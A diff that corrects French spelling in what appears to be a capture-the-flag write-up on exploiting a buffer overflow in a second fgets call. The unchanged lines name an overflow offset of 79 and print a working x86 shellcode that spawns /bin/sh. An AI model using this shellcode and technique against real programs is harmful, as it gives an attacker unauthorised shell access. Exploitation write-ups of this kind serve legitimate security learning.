@@ -1,4 +1,4 @@
-1. On remarque le buffer overflow sur le deuxieme fgets. Pour exploiter la faille on passe le nom d'utilisateur attendu en debut de chaine, on remplis le buffer et enfin notre payload.
+1. On remarque le buffer overflow sur le deuxieme fgets. Pour exploiter la faille on passe le nom d'utilisateur attendu en debut de chaine, on remplit le buffer et enfin notre payload.
 
 2. On trouve l'offset
    ```
@@ -9,7 +9,7 @@
    ```
    > 79
 
-3. On choisi un shellcode
+3. On choisit un shellcode
    ```
    \x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
    ```
